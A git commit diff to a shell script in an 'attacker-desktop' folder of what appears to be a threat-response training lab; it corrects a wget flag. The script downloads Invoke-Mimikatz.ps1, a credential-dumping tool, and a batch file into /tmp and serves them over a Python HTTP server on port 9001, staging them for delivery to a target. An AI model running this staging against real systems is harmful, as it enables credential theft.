74080bb08e6746f0400a542662a720ef059c345d
Moses Frost <moses@moses.io>
2018-05-21 19:40:05 -0400

    changed the -o in the live.sh file to -O for wget

--- LIVE/attacker-desktop/live.sh
+++ LIVE/attacker-desktop/live.sh
@@ -1,8 +1,8 @@
 #!/bin/bash
 
-wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -o /tmp/Invoke-Mimikatz.ps1
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
 
-wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -o /tmp/safe.bat
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -O /tmp/safe.bat
 
 cd /tmp
 python -m 'SimpleHTTPServer' 9001
